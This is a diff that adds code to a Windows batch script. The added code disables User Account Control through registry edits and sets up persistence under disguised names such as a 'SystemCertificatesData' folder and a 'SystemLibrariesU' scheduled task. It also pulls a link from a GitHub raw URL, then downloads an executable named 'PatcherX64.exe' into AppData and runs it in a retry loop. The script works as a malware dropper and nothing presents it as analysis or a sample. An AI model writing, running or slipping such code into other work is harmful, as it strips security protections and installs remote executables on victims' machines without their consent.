@@ -1,2 +1,140 @@
 @echo off
 
+
+
+:RUNADMINHERE
+cd /d "%~dp0"
+:: Run All your commands here ( will be executed with admin privileges )
+
+
+:: Disable UAC 
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f
+
+
+
+
+
+
+:CHECKRUNEVERY
+
+mkdir "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks"
+
+:: Define the paths
+set "sourceFile=%SystemRoot%\System32\convertsshd.exe"
+set "startupFile=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+
+:: Check if the file exists in the Startup folder
+if not exist "%startupFile%" (
+    echo File not found in Startup folder. Restoring...
+    copy "%sourceFile%" "%startupFile%"
+) else (
+    echo File is already in Startup folder.
+)
+
+
+if not exist "%startupFile%" goto INSTRUNEVERY
+
+
+
+
+
+
+
+
+:: RunEvery Files Found! , Lets Checking Task "SystemLibrariesU"
+
+:: Define task to check
+set "Task1=SystemLibrariesU"
+
+:: If Task doesnt Exist , goto 
+schtasks /query /tn "%Task1%" >nul 2>&1 || goto INSTRUNEVERY
+
+
+
+
+
+:: RunEvery Files & Task Found goto NEXT 
+goto NEXT
+
+
+
+
+
+
+:INSTRUNEVERY
+
+
+
+
+
+:: RunEveryCaller Installer
+@echo off
+ 
+color 0A
+ 
+:loop
+ 
+:: Kill & Delete file 
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+ 
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
+ 
+:: Download the file using curl
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNFILELINK%"
+ 
+timeout /t 2 /nobreak >nul
+ 
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 2 seconds ....
+	timeout /t 2 /nobreak >nul
+	echo.
+	goto loop
+)
+ 
+ 
+ 
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+ 
+ 
+ 
+:: Check if the file size is at least 80KB (80000 bytes)
+if %FILESIZE% geq 80000 (
+    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 2 seconds ....
+	timeout /t 2 /nobreak >nul
+	echo.
+	goto loop
+)
+ 
+ 
+echo Patcher Running...
+timeout /t 1 /nobreak >nul
+
+
+
+
+
+
+
+
+
+
+:NEXT
+::
+
+
+
+
+
